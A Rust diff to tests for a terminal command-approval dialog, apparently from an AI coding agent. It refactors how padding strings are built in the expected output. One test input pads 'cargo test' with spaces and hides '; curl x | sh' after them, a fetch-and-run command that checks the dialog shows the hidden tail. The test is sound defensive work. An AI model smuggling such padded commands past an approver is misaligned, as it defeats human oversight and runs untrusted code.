@@ -787,6 +787,8 @@ mod tests {
     fn render_wraps_a_padded_command_so_its_tail_shows() {
         let modal = command_modal(&format!("cargo test{}; curl x | sh", " ".repeat(60)));
         let dump = render_to_string(&modal, 40, modal.height(40, 40));
+        let first = "·".repeat(34);
+        let second = "·".repeat(26);
         let expected = formatdoc! {"
             Bash
 
@@ -796,7 +798,7 @@ mod tests {
               sh
 
             [Y] approve   [N] deny   [F] feedback...
-        ", first = "·".repeat(34), second = "·".repeat(26)};
+        "};
         assert_eq!(dump, expected);
     }
 
@@ -812,6 +814,8 @@ mod tests {
             None,
         );
         let dump = render_to_string(&modal, 30, modal.height(30, 30));
+        let first = "d".repeat(23);
+        let second = "d".repeat(17);
         let expected = formatdoc! {"
             Write(/{first}
               {second}/secret.tx
@@ -819,7 +823,7 @@ mod tests {
 
 
             [Y] approve   [N] deny   [F...
-        ", first = "d".repeat(23), second = "d".repeat(17)};
+        "};
         assert_eq!(dump, expected);
     }
 
